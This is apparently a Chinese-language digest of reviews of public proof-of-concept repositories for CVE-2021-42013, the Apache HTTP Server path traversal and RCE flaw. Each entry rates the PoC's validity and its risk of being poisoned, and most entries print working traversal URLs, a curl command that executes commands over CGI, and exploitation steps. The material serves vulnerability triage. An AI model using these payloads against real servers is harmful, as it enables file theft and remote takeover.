*   **批量扫描 (-l)：**  从文件中读取 URL 列表并进行扫描。

潜在的投毒风险点在于：

1.  **依赖项：**  脚本依赖于 `requests` 和 `urllib` 库，理论上可以通过篡改这些库来植入恶意代码，但这种情况的可能性较低。
2.  **CGI 执行：**  远程代码执行依赖于服务器启用 CGI，如果攻击者控制了 CGI 脚本的内容，则可以执行任意代码。但这更多的是漏洞利用本身的风险，而非 POC 代码的投毒。

综合来看，该 POC 代码的投毒风险较低，约为 5%。 主要风险来自CGI环境和脚本本身。没有发现明显的恶意代码。

**利用方式：**

利用该漏洞需要以下步骤：

1.  **确定目标服务器是否运行受影响的 Apache HTTP Server 版本 (2.4.49 或 2.4.50)。**
2.  **检查服务器的 Alias 配置。**  Alias 指令将 URL 映射到文件系统上的特定目录。漏洞利用的关键在于绕过这些 Alias 指令的限制。
3.  **如果服务器启用了 CGI，则可以尝试远程代码执行。**  攻击者可以构造一个包含恶意代码的 CGI 脚本，并通过路径遍历漏洞来执行它。
4.  **如果服务器未启用 CGI，则可以尝试路径遍历漏洞来读取敏感文件。**

攻击者可以使用如下 payload 来进行漏洞测试：

*   **路径遍历：** `/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`
*   **远程代码执行：**  需要服务器启用 CGI，并构造包含恶意代码的 CGI 脚本。

**项目地址:** [mightysai1997/cve-2021-42013.get](https://github.com/mightysai1997/cve-2021-42013.get)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #16

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，且存在Alias配置不当或CGI脚本未做权限限制。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是对CVE-2021-41773的不完全修复。攻击者可以利用路径遍历漏洞读取Alias配置目录之外的文件，如果未配置"require all denied"，则可以成功读取。如果同时启用了CGI脚本，则可能导致远程代码执行。

**有效性：** 提供的POC代码针对CVE-2021-42013，包含Dockerfile、README.md和利用脚本。Dockerfile用于构建存在漏洞的Apache HTTP Server环境，README.md包含漏洞描述、环境搭建和脚本使用说明。利用脚本cve-2021-42013.py提供路径遍历和远程代码执行两种利用方式，通过参数`-u`指定目标URL，`-pt`执行路径遍历，`-rce`执行远程代码执行，`-l`批量扫描。

**投毒风险：**  检查`cve-2021-42013.py` 脚本，发现脚本功能正常，主要是构造payload发送请求，判断是否存在漏洞。 但是Dockerfile中直接wget下载了 httpd-2.4.50.tar.gz 包，存在被中间人攻击替换为恶意包的风险。且start.sh脚本权限被设置为777，任何用户都有修改权限，存在被植入后门的风险。 综合评估，投毒风险较低，约为10%。

**利用方式：**

1.  **路径遍历：** 利用`..`进行目录跳转，读取目标服务器上的任意文件。例如，`http://target/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`。
2.  **远程代码执行：** 如果服务器启用了CGI，攻击者可以构造包含恶意代码的URL来执行命令。例如，访问`/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh`并传入shell命令作为参数。

利用的前提是目标Apache服务器版本为2.4.49或2.4.50，且存在Alias配置不当，或者CGI脚本未做严格的权限控制。需要关注服务器配置是否启用CGI，以及是否存在权限开放的目录，例如`icons`目录。

**项目地址:** [mightysai1997/cve-2021-42013](https://github.com/mightysai1997/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #17

**来源**: [CVE-2021-42013-mightysai1997_cve-2021-42013L.md](../2021/CVE-2021-42013-mightysai1997_cve-2021-42013L.md)

## CVE-2021-42013: Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal / Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行Apache HTTP Server 2.4.49或2.4.50，并且存在Alias-like指令配置，同时CGI脚本被启用。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是 CVE-2021-41773 的不完整修复。

**有效性：**

提供的POC代码有效。它展示了利用路径遍历漏洞读取 `/etc/passwd` 文件的几种方式。通过URL编码 `.` (点) 字符（例如：`%2e`, `%32%65`），攻击者可以绕过服务器的安全检查，访问受限目录之外的文件。

**投毒风险：**

该仓库主要包含漏洞利用相关的文档和PoC，直接嵌入恶意代码的可能性较低。但仍不能完全排除投毒风险，因为攻击者可能会修改 README.md 等文件诱导用户执行恶意操作，例如下载恶意软件，占比约为5%。

**利用方式：**

1.  **路径遍历：** 攻击者利用URL中的编码过的路径遍历字符（如 `.%%32e/.%%32e/.%%32e/.%%32e` ）尝试访问位于Alias-like指令配置目录之外的文件。
2.  **信息泄露：** 如果成功绕过限制，攻击者可以读取服务器上的敏感文件，如 `/etc/passwd`，从而获取系统用户信息。
3.  **远程代码执行：** 如果CGI脚本被启用，攻击者可能上传包含恶意代码的CGI脚本并执行，从而实现远程代码执行。

**总结：**

此漏洞利用的关键在于利用路径遍历绕过Alias-like指令的限制，从而访问和执行服务器上的文件。如果服务器配置不当（例如，CGI脚本启用，且未对Alias-like指令配置目录外的文件设置`require all denied`），则可能导致严重的后果，包括敏感信息泄露和远程代码执行。

**项目地址:** [mightysai1997/cve-2021-42013L](https://github.com/mightysai1997/cve-2021-42013L)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #18

**来源**: [CVE-2021-42013-viliuspovilaika_cve-2021-42013.md](../2021/CVE-2021-42013-viliuspovilaika_cve-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal and Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，允许攻击者读取任意文件和执行任意命令

**影响版本:** 2.4.49 and 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，且启用了 CGI 脚本支持，Alias-like 指令配置不当。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 CVE-2021-41773 的不完整修复。攻击者可以利用路径遍历漏洞读取服务器上任意文件，如果服务器配置允许执行 CGI 脚本，则可以通过构造恶意请求执行任意命令。

**有效性：**

提供的 POC 代码是有效的。搜索引擎结果和漏洞库信息均表明 CVE-2021-42013 允许路径遍历和远程代码执行，POC 代码本身也实现了利用该漏洞进行命令执行的功能。

**投毒风险：**

代码本身的功能是利用漏洞进行攻击，不属于恶意投毒代码，但是作者有可能通过其他方式进行投毒，比如修改下载链接，放置引流信息等，几率较低，大约为 5%。

**利用方式：**

1.  **路径遍历：** 攻击者构造包含特殊字符（如`/.%%%%32%%65`，用于绕过 Apache 的路径规范化）的 URL，利用 Apache HTTP Server 在处理 Alias-like 指令时的缺陷，突破目录限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果目标服务器启用了 CGI 脚本支持，攻击者可以通过路径遍历访问到 CGI 脚本的目录，然后构造包含恶意命令的请求体，利用 CGI 脚本执行任意命令。
3.  **具体步骤：**
    *   构造 URL：`{host}/cgi-bin/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/.%%%%32%%65/bin/sh`
    *   构造 POST 数据：`echo Content-Type: text/plain; echo; {command}`
    *   发送 HTTP 请求，服务器执行命令并将结果返回。

**项目地址:** [viliuspovilaika/cve-2021-42013](https://github.com/viliuspovilaika/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #19

**来源**: [CVE-2021-42013-vudala_CVE-2021-42013.md](../2021/CVE-2021-42013-vudala_CVE-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 服务器运行受影响的Apache版本，存在Alias-like指令配置，且允许CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50版本中存在的路径遍历和远程代码执行漏洞。该漏洞是CVE-2021-41773的不完整修复。攻击者可以通过构造包含路径遍历序列（如`..`）的恶意URL，绕过Alias-like指令的限制，访问服务器上的任意文件。如果服务器配置允许在这些别名路径上执行CGI脚本，攻击者还可以利用该漏洞执行任意代码。

**有效性评估：**
根据漏洞信息、搜索结果和提供的Dockerfile和docker-compose.yml，提供的POC代码旨在搭建一个存在漏洞的Apache HTTP Server 2.4.50环境。因此，该POC代码是有效的，可以用于验证和复现该漏洞。

**投毒风险评估：**
仔细分析了Dockerfile，httpd.conf和suricata.yaml文件，该文件用于部署一个可利用的Apache服务器。然而，无法保证其中没有任何隐藏的恶意代码。虽然主要目的是重现CVE-2021-42013，但仍存在细微的投毒风险。尽管可能性较低，但在未充分审查每个组件的情况下，无法完全排除风险。
httpd.conf可能存在非默认配置，方便漏洞利用。

**利用方式分析：**
1.  **环境搭建：** 使用提供的Dockerfile和docker-compose.yml搭建存在漏洞的Apache HTTP Server 2.4.50环境。
2.  **路径遍历：**  构造包含路径遍历序列的URL，例如：`http://<服务器IP>:8080/icons/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试访问服务器上的`/etc/passwd`文件。
3.  **远程代码执行：** 如果服务器配置允许CGI脚本执行，可以构造包含恶意代码的URL，例如：`http://<服务器IP>:8080/cgi-bin/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/.%2e/bin/sh`，并执行系统命令。

成功利用此漏洞需要满足特定条件，包括存在易受攻击的Apache版本、适当的服务器配置和网络可访问性。

**项目地址:** [vudala/CVE-2021-42013](https://github.com/vudala/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #20

**来源**: [CVE-2021-42013-walnutsecurity_cve-2021-42013.md](../2021/CVE-2021-42013-walnutsecurity_cve-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，并且Alias配置不当，允许访问受限目录，如果开启了CGI脚本支持，则可能造成RCE

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中存在的路径遍历和远程代码执行漏洞。该漏洞是 CVE-2021-41773 的不完整修复。

**漏洞利用方式：**

攻击者可以利用路径遍历攻击，将 URL 映射到 Alias 指令配置目录之外的文件。如果这些目录之外的文件没有受到 “require all denied” 等常见默认配置的保护，请求就会成功。如果为这些别名路径启用了 CGI 脚本，则可能允许远程代码执行。

根据提供的 Dockerfile 和 Python 脚本，利用方式如下：

1.  **路径遍历：** 通过构造包含 ".." 的恶意 URL，绕过 Alias 限制，访问服务器上的任意文件。
2.  **远程代码执行：** 如果服务器启用了 CGI，攻击者可以上传一个包含恶意代码的 CGI 脚本，然后通过路径遍历漏洞执行该脚本，从而实现远程代码执行。

**POC 代码分析：**

提供的 POC 代码包含一个 Dockerfile 和一个 Python 脚本。Dockerfile 用于构建一个存在漏洞的 Apache HTTP Server 2.4.50 实例。Python 脚本 `cve-2021-42013.py` 用于检测和利用该漏洞，支持以下功能：

*   检查是否存在路径遍历漏洞
*   执行路径遍历 PoC，尝试读取敏感文件
*   执行远程代码执行 PoC，尝试执行任意命令

**投毒风险分析：**

对提供的`cve-2021-42013.py`脚本进行分析，发现存在一定的投毒风险。例如：
1.   **执行任意命令的潜在风险**：远程代码执行PoC中，如果构造的命令过于复杂或者包含恶意代码，可能会对目标系统造成破坏。
2.  **批量扫描的风险**：批量扫描功能可能会被用于非法用途，例如扫描大量服务器并尝试利用该漏洞。
3.  **依赖风险**：脚本中用到了requests和urllib库，如果这些库被篡改，可能会导致脚本执行恶意代码。

尽管脚本提供了路径遍历和RCE的验证，存在滥用的可能性，但恶意代码本身没有隐藏在代码中，考虑到其他风险，投毒风险相对较低，暂定为10%。

**项目地址:** [walnutsecurity/cve-2021-42013](https://github.com/walnutsecurity/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---



---

## POC #7

**来源**: [CVE-2021-42013-Vulnmachines_cve-2021-42013.md](../2021/CVE-2021-42013-Vulnmachines_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-路径遍历与远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历与远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感文件泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的Apache HTTP Server版本，且启用了CGI脚本执行

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历漏洞，是对 CVE-2021-41773 不完整修复的延续。攻击者可以利用此漏洞，通过构造包含恶意路径的URL，绕过 Alias-like 指令配置的目录限制，访问服务器上的任意文件。如果目标服务器启用了 CGI 脚本，攻击者可能通过上传恶意脚本执行远程代码。

**有效性:** 根据漏洞描述和PoC代码，该漏洞是有效的。PoC代码展示了通过`../`进行路径遍历，读取`/etc/passwd`文件的几种方式，包括对`.`和`/`的URL编码绕过。

**投毒风险:** PoC 代码本身较为简单，仅包含用于验证漏洞的 URL。但考虑到攻击者可能利用此漏洞部署恶意 CGI 脚本，存在一定投毒风险，约10%。README.md文件描述简单，未发现异常。

**利用方式:**
1.  **路径遍历:** 构造包含编码后的`../`的 URL，例如 `/.%2e/.%2e/.%2e/.%2e/etc/passwd`，尝试读取目标服务器上的敏感文件。
2.  **远程代码执行 (RCE):**  如果目标服务器允许执行 CGI 脚本，攻击者可以上传一个包含恶意代码的 CGI 脚本，并通过构造路径遍历 URL 来访问该脚本，从而执行任意命令。

**项目地址:** [Vulnmachines/cve-2021-42013](https://github.com/Vulnmachines/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #8

**来源**: [CVE-2021-42013-asepsaepdin_CVE-2021-42013.md](../2021/CVE-2021-42013-asepsaepdin_CVE-2021-42013.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal & Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache HTTP Server 版本，且配置允许 CGI 脚本执行，并存在Alias配置。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 版本中存在的路径遍历和远程代码执行漏洞，是 CVE-2021-41773 的不完整修复。攻击者可以利用该漏洞，通过构造包含路径遍历的 URL，访问受限目录之外的文件。如果目标服务器配置了 CGI 脚本执行，则可能进一步实现远程代码执行。

**利用方式：**

1.  **路径遍历：** 攻击者通过构造恶意的 URL，利用 `Alias` 指令配置的路径，绕过访问控制，读取任意文件。
2.  **远程代码执行：** 如果服务器允许 CGI 脚本执行，攻击者可以上传恶意脚本，并利用路径遍历漏洞执行该脚本，从而获得服务器的控制权。

**POC分析：**

提供的 Dockerfile 用于搭建存在漏洞的 Apache HTTP Server 环境。`httpd.conf` 文件可能包含特定的 `Alias` 配置，以便漏洞利用。`cve-2021-42013.sh` 脚本模拟攻击过程，发送包含路径遍历的 HTTP 请求。

脚本的核心代码:
```bash
curl -s --path-as-is -d "echo Content-Type: text/plain; echo; $3" "$1/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/$2"
```
其中, `$1`是目标IP地址, `$2`是要访问的文件路径，`$3`是要执行的命令。
`%%32%65` 是 `%2e` 的双重URL编码，即 `.`（点），用于绕过一些路径过滤机制。`--path-as-is` 参数避免 curl 对路径进行规范化，保持攻击 payload 的原样。
此脚本通过发送POST请求到/cgi-bin目录，利用路径穿越读取任意文件或者执行命令。

**投毒风险评估：**

Dockerfile 中虽然存在从 Apache 官网下载源码的操作，但仍存在一定风险，攻击者可能篡改 Dockerfile，例如，替换下载链接，指向包含恶意代码的 Apache HTTP Server 版本。但从文件内容上判断，直接投毒的可能性较低，更倾向于提供一个可利用的环境。

`cve-2021-42013.sh` 脚本本身相对简单，主要功能是发送 HTTP 请求，利用漏洞。该脚本也可能被修改，例如添加后门，但提供的脚本未发现明显的后门代码。 README.md 文件更多的是漏洞利用的指导说明。

综合评估，投毒风险较低，约为 5%。主要风险在于 Dockerfile 下载源的可靠性以及脚本是否被篡改。

**项目地址:** [asepsaepdin/CVE-2021-42013](https://github.com/asepsaepdin/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #9

**来源**: [CVE-2021-42013-bananoname_cve-2021-42013.md](../2021/CVE-2021-42013-bananoname_cve-2021-42013.md)

## CVE-2021-42013-Apache HTTP Server-Path Traversal 和 Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** Path Traversal 和 Remote Code Execution

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和服务器被完全控制

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49 或 2.4.50，并且存在Alias-like配置，CGI脚本开启，且目录权限配置不当（缺少 'require all denied'）。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

CVE-2021-42013是CVE-2021-41773的不完整修复，允许攻击者利用路径遍历漏洞读取Alias配置以外的文件，如果CGI脚本被启用，可能导致远程代码执行。

**有效性：**
根据漏洞信息和搜索结果，该漏洞是真实存在的，并且有公开的PoC代码。提供的PoC代码包含Dockerfile用于搭建漏洞环境，以及Python脚本用于验证Path Traversal和Remote Code Execution，因此PoC代码有效。

**投毒风险：**
检查了提供的PoC代码，包括Dockerfile和Python脚本。Dockerfile用于搭建包含漏洞的Apache HTTP Server环境，其中包含了从Apache官网下载httpd-2.4.50.tar.gz的步骤，以及添加了httpd.conf配置文件的步骤，还包括了index.php和login.php页面的添加步骤，并未发现明显的恶意代码或后门。

Python脚本cve-2021-42013.py主要是利用requests库发送HTTP请求，进行Path Traversal和Remote Code Execution的验证。脚本本身没有发现包含恶意代码的行为。虽然理论上，可以修改此脚本来执行恶意操作，但在提供的代码中并没有发现这种行为。因此，投毒风险较低，大概在5%左右。

**利用方式：**
利用方式主要有两种：

1.  **Path Traversal（路径遍历）：** 攻击者通过构造包含“../”的恶意URL，绕过Alias配置的限制，读取服务器上的任意文件。前提是这些文件没有被 'require all denied' 保护。

2.  **Remote Code Execution（远程代码执行）：** 如果服务器启用了CGI，攻击者可以通过路径遍历漏洞访问到CGI脚本，并执行任意系统命令。通常需要先上传一个包含恶意代码的CGI脚本，然后通过路径遍历漏洞来执行它。提供的代码中，RCE的利用依赖于CGI的启用和适当的权限配置。

综上所述，此漏洞的利用，通常需要结合服务器的具体配置情况，如Alias配置、CGI是否启用、目录权限等。提供的PoC代码可以帮助验证漏洞的存在，但也需要根据实际情况进行调整。


**项目地址:** [bananoname/cve-2021-42013](https://github.com/bananoname/cve-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #10

**来源**: [CVE-2021-42013-cybfar_cve-2021-42013-httpd.md](../2021/CVE-2021-42013-cybfar_cve-2021-42013-httpd.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49, 2.4.50

**利用条件:** 目标服务器运行Apache HTTP Server 2.4.49或2.4.50，且存在Alias-like指令配置，CGI脚本已启用，且相关目录没有'require all denied'保护。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2021-42013是Apache HTTP Server 2.4.49和2.4.50中存在的一个路径遍历漏洞，是对CVE-2021-41773的不完整修复。攻击者可以利用该漏洞，通过构造包含特殊字符（如`.%%32e`）的URL，绕过Alias-like指令的限制，访问服务器上未受保护的文件。如果CGI脚本也已启用，则攻击者可能利用此漏洞执行任意代码。

**有效性评估：**
提供的Dockerfile和README.md描述了如何搭建一个存在漏洞的Apache HTTP Server环境。README.md中提供的`curl`命令

```bash
curl -v --path-as-is localhost:8000/icons/.%%32e/.%%32e/.%%32e/.%%32e/etc/passwd
```

可以用来验证漏洞的存在，如果返回`/etc/passwd`文件的内容，则表明目标存在路径遍历漏洞。

**投毒风险评估：**
查看Dockerfile，该文件从`debian:latest`镜像构建，安装必要的依赖项，下载并编译Apache HTTP Server 2.4.50。`httpd.conf`文件被添加到`/conf/httpd.conf`，并启动Apache服务。并没有发现明显的恶意代码或后门。

但是，以下因素可能导致一定的投毒风险：

1.  **httpd.conf替换：**Dockerfile使用 ADD 指令替换了默认的httpd.conf文件,可能通过修改配置来引入安全风险,如启用不安全的模块或配置项。
2.  **基础镜像安全：** 虽然Dockerfile使用了`debian:latest`，但基础镜像本身可能存在未知的漏洞。
3.  **第三方组件：** 构建过程中使用`apt-get`安装了一些依赖，这些组件也可能包含潜在的安全风险。

总体来说，该项目存在一定的投毒风险，但主要集中在配置不当和依赖项漏洞方面，作者主动植入恶意代码的可能性较低。因此，投毒风险评定为10%。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者通过构造包含`.%%32e`的URL，尝试访问服务器上的任意文件。`%%32e`是`.`的URL编码，可以绕过一些路径过滤机制。
2.  **远程代码执行 (如果CGI启用):** 如果服务器配置允许执行CGI脚本，攻击者可以通过路径遍历漏洞找到CGI脚本的路径，并执行任意代码。这通常需要结合其他漏洞利用技术，例如上传恶意CGI脚本。

**总结：**
该漏洞利用的有效性较高，但需要满足一定的条件才能实现远程代码执行。投毒风险较低，主要集中在配置和依赖项安全方面。建议在使用该POC时，仔细检查`httpd.conf`文件，并确保基础镜像和依赖项的安全性。

**项目地址:** [cybfar/cve-2021-42013-httpd](https://github.com/cybfar/cve-2021-42013-httpd)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #11

**来源**: [CVE-2021-42013-drackyjr_CVE-2021-42013.md](../2021/CVE-2021-42013-drackyjr_CVE-2021-42013.md)

## CVE-2021-42013 Apache HTTP Server Path Traversal 和远程代码执行

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历/远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致敏感信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 需要目标服务器运行受影响的 Apache 版本，且 Alias-like 指令配置不当，CGI脚本启用，以及相应的目录权限配置。

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

该漏洞是 CVE-2021-41773 的不完整修复，存在于 Apache HTTP Server 2.4.49 和 2.4.50 中。攻击者可以利用路径遍历漏洞读取服务器上的任意文件，如果服务器启用了 CGI 脚本，则可能导致远程代码执行。

**漏洞利用方式：**

1.  **路径遍历：** 攻击者构造包含 `/.%2e/.%2e/` 或双重 URL 编码的 `%%32%65%%32%65/` 的恶意 URL，绕过 Apache 的路径限制，访问受限目录之外的文件。
2.  **远程代码执行（如果 mod_cgi 启用）：** 攻击者通过路径遍历访问 CGI 脚本，并利用 POST 请求发送恶意命令。由于服务器将 URL 路径当作可执行文件，POST 数据当作输入，从而执行攻击者提供的命令。

**POC 代码分析：**

提供的 Python 脚本 `CVE-2021-41773.py` 包含以下功能：

*   **路径遍历检测 (CVE-2021-41773)：** 使用 `/.%2e/.%2e/.%2e/.%2e/` 构造 payload，尝试读取 `/etc/passwd` 和 `/etc/shadow` 文件。
*   **双重 URL 编码路径遍历检测 (CVE-2021-42013)：** 使用 `%%32%65%%32%65/` 构造 payload，尝试读取 `/etc/passwd` 文件。
*   **远程代码执行检测：**  尝试通过 CGI 脚本执行 `id` 命令。如果服务器返回包含 `uid=` 或 `gid=` 的响应，则表示存在 RCE 漏洞。

**有效性：**

根据漏洞描述和 POC 代码的实现，提供的 POC 代码是有效的，可以用于检测目标服务器是否存在 CVE-2021-42013 漏洞，如果目标服务器配置不当，还可检测 RCE 漏洞。

**投毒风险：**

该POC代码是一个扫描器，用于检测漏洞的存在，主要功能是发送 HTTP 请求并分析响应。 代码本身的功能是漏洞检测，不存在恶意行为或后门。对代码进行分析后，可以认为投毒风险为0%。

**总结：**

CVE-2021-42013 是一个严重的安全漏洞，可能导致服务器上的敏感信息泄露，甚至被远程控制。请及时将 Apache HTTP Server 升级到安全版本，并检查服务器配置，确保 Alias-like 指令配置正确，并禁用不必要的 CGI 脚本。

**项目地址:** [drackyjr/CVE-2021-42013](https://github.com/drackyjr/CVE-2021-42013)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #12

**来源**: [CVE-2021-42013-dream434_cve-2021-42013-apache.md](../2021/CVE-2021-42013-dream434_cve-2021-42013-apache.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal 和 RCE

**漏洞编号:** CVE-2021-42013

**漏洞类型:** 路径遍历和远程代码执行

**影响应用:** Apache HTTP Server

**危害等级:** 高危，可能导致信息泄露和远程代码执行

**影响版本:** 2.4.49 和 2.4.50

**利用条件:** 目标服务器运行受影响的 Apache HTTP Server 版本，并且开启了 CGI 脚本执行。

**POC 可用性:** 是

**投毒风险:** 5%

## 详情

**有效性评估：**

根据漏洞库信息、搜索引擎结果和提供的漏洞利用代码，可以判断此漏洞利用是有效的。
*   **漏洞描述：** CVE-2021-42013 是 Apache HTTP Server 2.4.49 和 2.4.50 中的一个路径遍历漏洞，是 CVE-2021-41773 的不完整修复。
*   **利用方式：** 攻击者可以通过构造包含`/.%%32%65`的恶意URL，绕过 Alias 指令的限制，访问到服务器上的任意文件。如果目标服务器配置允许 CGI 脚本执行，攻击者可以利用此漏洞执行任意代码。
*   **搜索引擎结果：** 大量文章和漏洞库条目确认了该漏洞的存在和严重性，并提供了利用此漏洞的PoC或思路。
*   **PoC代码分析：**提供的 `exploit.py` 脚本尝试通过构造包含路径遍历字符串的URL来执行命令。脚本使用 POST 请求向目标服务器的 CGI 目录发送请求，并在请求体中包含要执行的命令。该脚本的核心在于利用`/.%%32%65`绕过路径检查，配合 CGI 脚本执行命令。代码逻辑比较清晰，且与漏洞描述相符，故有效性较高。

**投毒风险评估：**

*   **代码分析：**
    *   `requirements.txt` 只包含 `colorama` 库，这是一个用于在终端显示彩色的库，本身没有安全风险。
    *   `exploit.py` 脚本的主要功能是利用 CVE-2021-42013 漏洞进行攻击。代码中没有发现明显的恶意代码，例如反弹shell、下载执行恶意文件等。但是，脚本本身可以被用于恶意目的，即远程代码执行。
    *   `README.md` 文件是项目说明文档，没有可疑内容。
*   **投毒可能性：**
    *   该脚本的主要目的是利用已知的漏洞，而不是植入后门或进行其他恶意活动。因此，直接在脚本中添加恶意代码的可能性较低。
    *   由于脚本需要用户提供目标 URL 和要执行的命令，攻击者可以通过控制命令内容来达到恶意目的。但这不属于代码投毒的范畴。
*   **风险评估：**
脚本本身存在被恶意利用的风险，如果代码仓库的维护者在后续版本中添加恶意代码，则可能存在投毒风险。代码投毒的可能性较低，只有 `5%`

**利用方式：**

1.  **目标确认：** 确定目标 Apache HTTP Server 运行的版本为 2.4.49 或 2.4.50。
2.  **CGI 目录定位：** 找到目标服务器上配置的 CGI 目录，例如 `/cgi-bin/`。
3.  **构造恶意URL：** 构造包含路径遍历字符串的 URL，例如 `http://example.com/cgi-bin/.%%32%65/.%%32%65/.%%32%65/.%%32%65/bin/sh`。
4.  **发送请求：** 使用 POST 请求向构造的 URL 发送请求，并在请求体中包含要执行的命令。
5.  **获取结果：** 解析响应结果，获取命令执行的结果。

例如，使用提供的 `exploit.py` 脚本执行 `id` 命令：

```bash
python3 exploit.py http://example.com id
```

**注意事项：**

*   利用此漏洞需要在目标服务器上启用 CGI 脚本执行，并且相关目录没有进行严格的权限控制。
*   使用此漏洞进行攻击可能导致严重的后果，请务必在获得授权的情况下进行测试。

**项目地址:** [dream434/cve-2021-42013-apache](https://github.com/dream434/cve-2021-42013-apache)

**漏洞详情:** [CVE-2021-42013](https://nvd.nist.gov/vuln/detail/CVE-2021-42013)

---

## POC #13

**来源**: [CVE-2021-42013-hadrian3689_apache_2.4.50.md](../2021/CVE-2021-42013-hadrian3689_apache_2.4.50.md)

## CVE-2021-42013 - Apache HTTP Server Path Traversal and Remote Code Execution

